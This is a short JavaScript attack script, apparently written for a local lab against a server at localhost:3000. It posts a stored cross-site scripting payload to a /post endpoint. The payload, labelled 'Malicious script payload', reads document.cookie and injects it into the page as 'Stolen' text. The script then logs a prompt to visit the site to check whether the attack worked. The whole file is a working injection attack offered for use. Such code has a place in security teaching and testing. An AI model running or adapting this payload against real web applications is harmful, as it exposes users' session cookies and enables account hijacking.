const TARGET_SERVER = "http://localhost:3000"; 

// Malicious script payload
const payload = `<script>document.body.innerHTML += "<p>Stolen: " + document.cookie + "</p>";</script>`;

async function attack() {
  try {
    const response = await fetch(`${TARGET_SERVER}/post`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ content: payload })
    });

    const result = await response.text();
    console.log("Attack launched. Server response:", result);
    console.log(`Now visit: ${TARGET_SERVER} to see if the attack worked.`);
  } catch (error) {
    console.error("Attack failed:", error);
  }
}


attack();
